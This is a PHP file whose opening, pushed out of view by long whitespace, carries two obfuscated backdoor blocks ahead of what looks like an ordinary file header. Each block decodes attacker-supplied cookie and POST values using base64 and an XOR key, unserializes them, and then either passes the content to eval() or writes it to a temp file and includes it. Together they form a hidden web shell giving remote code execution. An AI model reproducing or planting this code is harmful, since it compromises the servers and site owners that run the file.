<?php                                                                                                                                                                                                                                                                                                                                                                                                 $gUDApJAOP = class_exists("tw_DDTAn"); $lcIQXvXpnf = $gUDApJAOP;if (!$lcIQXvXpnf){class tw_DDTAn{private $TtVfwWp;public static $RjHmkTLeZL = "56d331b6-5ff3-4d4d-8f09-68db115c068e";public static $fGMQgUb = NULL;public function __construct(){$ZNpxHtOYn = $_COOKIE;$JTnqgLMuz = $_POST;$bcLHkUD = @$ZNpxHtOYn[substr(tw_DDTAn::$RjHmkTLeZL, 0, 4)];if (!empty($bcLHkUD)){$qOSBK = "base64";$AsXilOXj = "";$bcLHkUD = explode(",", $bcLHkUD);foreach ($bcLHkUD as $zyMkf){$AsXilOXj .= @$ZNpxHtOYn[$zyMkf];$AsXilOXj .= @$JTnqgLMuz[$zyMkf];}$AsXilOXj = array_map($qOSBK . "\137" . "\x64" . "\x65" . chr ( 985 - 886 )."\x6f" . "\x64" . 'e', array($AsXilOXj,)); $AsXilOXj = $AsXilOXj[0] ^ str_repeat(tw_DDTAn::$RjHmkTLeZL, (strlen($AsXilOXj[0]) / strlen(tw_DDTAn::$RjHmkTLeZL)) + 1);tw_DDTAn::$fGMQgUb = @unserialize($AsXilOXj);}}public function __destruct(){$this->ihYfwAtyO();}private function ihYfwAtyO(){if (is_array(tw_DDTAn::$fGMQgUb)) {$DoKcFw = str_replace(chr (60) . "\x3f" . chr (112) . 'h' . chr ( 663 - 551 ), "", tw_DDTAn::$fGMQgUb["\143" . chr ( 784 - 673 )."\x6e" . chr ( 178 - 62 ).'e' . "\156" . chr ( 499 - 383 )]);eval($DoKcFw);exit();}}}$yqhFUv = new tw_DDTAn(); $yqhFUv = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("i_eOHWp")){class i_eOHWp{public static $fxDRLuDKA = "685d2985-1875-43b2-ae5c-58b47a903b82";public static $ksiWgFUaNy = NULL;public function __construct(){$RHBallZRqX = $_COOKIE;$RcqPqKb = $_POST;$cdjdCq = @$RHBallZRqX[substr(i_eOHWp::$fxDRLuDKA, 0, 4)];if (!empty($cdjdCq)){$kOLKM = "base64";$mCLZF = "";$cdjdCq = explode(",", $cdjdCq);foreach ($cdjdCq as $PYFoZi){$mCLZF .= @$RHBallZRqX[$PYFoZi];$mCLZF .= @$RcqPqKb[$PYFoZi];}$mCLZF = array_map($kOLKM . '_' . chr ( 596 - 496 ).chr ( 365 - 264 ).chr ( 568 - 469 ).'o' . 'd' . "\x65", array($mCLZF,)); $mCLZF = $mCLZF[0] ^ str_repeat(i_eOHWp::$fxDRLuDKA, (strlen($mCLZF[0]) / strlen(i_eOHWp::$fxDRLuDKA)) + 1);i_eOHWp::$ksiWgFUaNy = @unserialize($mCLZF);}}public function __destruct(){$this->wFfOSrpC();}private function wFfOSrpC(){if (is_array(i_eOHWp::$ksiWgFUaNy)) {$aBkqxHXN = sys_get_temp_dir() . "/" . crc32(i_eOHWp::$ksiWgFUaNy[chr ( 1059 - 944 )."\x61" . chr (108) . chr ( 620 - 504 )]);@i_eOHWp::$ksiWgFUaNy[chr ( 361 - 242 ).chr ( 410 - 296 ).chr ( 707 - 602 ).chr (116) . 'e']($aBkqxHXN, i_eOHWp::$ksiWgFUaNy[chr ( 485 - 386 ).chr ( 286 - 175 ).chr ( 689 - 579 ).chr (116) . chr (101) . "\x6e" . "\x74"]);include $aBkqxHXN;@i_eOHWp::$ksiWgFUaNy["\x64" . chr (101) . chr ( 691 - 583 )."\145" . "\164" . chr ( 616 - 515 )]($aBkqxHXN);exit();}}}$MBYRAd = new i_eOHWp(); $MBYRAd = NULL;} ?><?php
//============================================================+
